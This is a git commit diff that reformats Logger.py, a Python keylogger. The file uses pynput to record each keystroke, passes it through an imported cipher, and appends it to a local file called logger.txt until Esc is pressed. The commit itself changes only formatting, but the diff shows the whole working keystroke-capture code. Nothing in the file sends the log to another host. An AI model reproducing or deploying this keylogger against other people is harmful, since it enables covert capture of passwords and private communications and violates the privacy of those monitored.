496c7de065b8c1043943f07d98fd9b3926180a34
linear0s <67293014+linear0s@users.noreply.github.com>
2023-06-19 22:43:59 -0500

    Updated formatting

--- Logger.py
+++ Logger.py
@@ -1,31 +1,36 @@
 from pynput.keyboard import Key, Controller, Listener
 import os
 from LimboAlg import cipher
+
 Keyboard = Controller()
+
+
 def main():
     def on_press(key):
         keydata = key
         keycode_to_replace = {
-            'Key.space': ' ',
-            'Key.enter': '\n',
-            'Key.backspace': '<--',
-            "'": '',
-            'Key.shift': ''
-        }    
+            "Key.space": " ",
+            "Key.enter": "\n",
+            "Key.backspace": "<--",
+            "'": "",
+            "Key.shift": "",
+        }
         if keydata != Key.esc:
             keydata = str(keydata)
-            for key,value in keycode_to_replace.items():
-                keydata = keydata.replace(key,value)
-            with open('logger.txt', 'a') as logs:
+            for key, value in keycode_to_replace.items():
+                keydata = keydata.replace(key, value)
+            with open("logger.txt", "a") as logs:
                 new_keydata = cipher(keydata)
                 logs.write(new_keydata)
         else:
             listener.stop()
             # os.remove('logger.txt')
-            with open('logger.txt', 'r') as l:
+            with open("logger.txt", "r") as l:
                 l.close()
-    with Listener( 
-        on_press=on_press) as listener:
+
+    with Listener(on_press=on_press) as listener:
         listener.join()
+
+
 if __name__ == "__main__":
     main()
